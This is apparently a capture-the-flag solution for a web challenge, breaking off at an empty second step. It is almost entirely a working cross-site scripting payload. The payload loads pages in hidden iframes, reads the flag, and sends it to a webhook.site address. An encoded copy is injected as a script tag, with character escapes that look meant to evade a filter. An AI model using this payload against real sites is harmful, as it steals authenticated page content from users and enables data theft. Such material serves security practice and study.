1) Create a new user with the following content, which will trigger the firewall (allowing us to upload "files"). Alternative is service workers.

Plain script:
```javascript
function readPage (url, callback) {
    if(window.child){ window.child.remove() }
    f = document.createElement("iframe"); f.src=url; f.id="child"; f.onload = function(){callback(child.contentWindow.document.body)};
    document.body.appendChild(f);
}

function exfil (content) {
    window.location = 'https://webhook.site/91631429-ca91-4d81-9bb0-44d78e338e48/leak?' + encodeURIComponent(content)
}

readPage("/", function(body) {
    const flagUrl = body.querySelector('li a').href;
    readPage(flagUrl, function(flagBody) {
        flag = flagBody.querySelector(".body").innerText;
        exfil(flag)
    })
})
```
<Script src="/create.php?a=loc%41tion%22;function%20readPage%20%28url%2C%20callback%29%20%7B%20%20%20%20%20if%28window.child%29%7B%20window.child.remove%28%29%20%7D%20%20%20%20%20f%20%3D%20document.createElement%28%22iframe%22%29%3B%20f.src%3Durl%3B%20f.id%3D%22child%22%3B%20f.onload%20%3D%20function%28%29%7Bcallback%28child.contentWindow.document.body%29%7D%3B%20%20%20%20%20document.body.appendChild%28f%29%3B%20%7D%20%20function%20exfil%20%28content%29%20%7B%20%20%20%20%20window.loc%61tion%20%3D%20%27https%3A%2F%2Fwebhook.site%2F91631429-ca91-4d81-9bb0-44d78e338e48%2Fleak%3F%27%20%2B%20encodeURIComponent%28content%29%20%7D%20%20readPage%28%22%2F%22%2C%20function%28body%29%20%7B%20%20%20%20%20const%20flagUrl%20%3D%20body.querySelector%28%27li%20a%27%29.href%3B%20%20%20%20%20readPage%28flagUrl%2C%20function%28flagBody%29%20%7B%20%20%20%20%20%20%20%20%20flag%20%3D%20flagBody.querySelector%28%22.body%22%29.innerText%3B%20%20%20%20%20%20%20%20%20exfil%28flag%29%20%20%20%20%20%7D%29%20%7D%29//"></script>
```

2)